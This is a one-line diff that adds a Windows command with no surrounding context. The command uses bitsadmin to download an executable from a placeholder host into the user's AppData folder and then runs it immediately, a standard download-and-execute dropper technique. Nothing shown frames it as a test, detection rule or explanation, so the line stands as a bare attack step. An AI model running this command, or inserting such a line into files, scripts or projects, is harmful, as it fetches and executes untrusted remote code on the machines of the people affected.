@@ -1,0 +1,1 @@
+cmd /c bitsadmin /transfer j https://example.invalid/b.exe %APPDATA%\b.exe & start %APPDATA%\b.exe
